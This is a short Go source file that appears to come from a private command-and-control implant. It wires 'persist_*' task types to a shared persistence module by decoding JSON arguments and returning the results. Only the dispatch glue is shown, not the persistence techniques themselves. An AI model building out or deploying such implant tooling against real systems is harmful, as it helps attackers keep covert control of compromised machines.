package main

import (
	"context"
	"fmt"

	"github.com/azizbinmohammad/private-c2/implant/modules/persist"
)

// persistHandler adapts one persist_* task type to the shared module.
func persistHandler(kind string) taskHandler {
	return func(ctx context.Context, args string) (string, error) {
		var req persist.Request
		if err := unmarshalArgs(args, &req); err != nil {
			return "", fmt.Errorf("persist_%s args must be JSON: %w", kind, err)
		}
		result, err := persist.Execute(ctx, kind, req)
		if err != nil {
			return "", err
		}
		return marshalJSON(result)
	}
}
